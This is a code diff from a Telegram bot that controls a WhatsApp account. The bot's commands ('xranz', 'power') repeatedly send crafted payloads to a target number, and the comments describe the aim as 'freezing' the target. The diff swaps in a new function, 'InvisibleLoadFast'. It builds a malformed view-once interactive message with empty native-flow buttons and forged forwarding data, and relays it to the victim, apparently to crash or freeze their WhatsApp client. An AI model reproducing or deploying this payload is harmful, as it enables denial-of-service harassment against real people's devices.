@@ -1460,8 +1460,8 @@ bot.command("xranz", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
 
   // Melakukan proses freezing 50 kali
   for (let i = 0; i < 3; i++) {
-        await crashUiV5(target, { ptcp: true });
-        await buginvite(target, { ptcp: true });
+        await InvisibleLoadFast(target, { ptcp: true });
+        await InvisibleLoadFast(target, { ptcp: true });
         
   }
 
@@ -1485,8 +1485,6 @@ bot.command("power", cooldownMiddleware, checkWhatsAppConnection, async ctx => {
   // Melakukan proses freezing 50 kali
   for (let i = 0; i < 1; i++) {
     await crashcursor(target, { ptcp: true });
-    await InVisiLoc(target, { ptcp: true });
-    await bokep(target, { ptcp: true });
   }
 
   // Menyelesaikan proses response
@@ -2801,6 +2799,67 @@ async function buginvite(target, ptcp = true) {
         console.error("Error sending newsletter:", err);
     }
 }
+async function InvisibleLoadFast(target) {
+      try {
+        let message = {
+          viewOnceMessage: {
+            message: {
+              messageContextInfo: {
+                deviceListMetadata: {},
+                deviceListMetadataVersion: 2,
+              },
+              interactiveMessage: {
+                contextInfo: {
+                  mentionedJid: [target],
+                  isForwarded: true,
+                  forwardingScore: 999,
+                  businessMessageForwardInfo: {
+                    businessOwnerJid: target,
+                  },
+                },
+                body: {
+                  text: "𝙉𝙖𝙣𝙤ી",
+                },
+                nativeFlowMessage: {
+                  buttons: [
+                    {
+                      name: "single_select",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "call_permission_request",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                    {
+                      name: "mpm",
+                      buttonParamsJson: "",
+                    },
+                  ],
+                },
+              },
+            },
+          },
+        };
+
+        await cay.relayMessage(target, message, {
+          participant: { jid: target },
+        });
+      } catch (err) {
+        console.log(err);
+      }
+    }
 async function crashUiV5(target, Ptcp = false) {
     cay.relayMessage(target, {
         ephemeralMessage: {
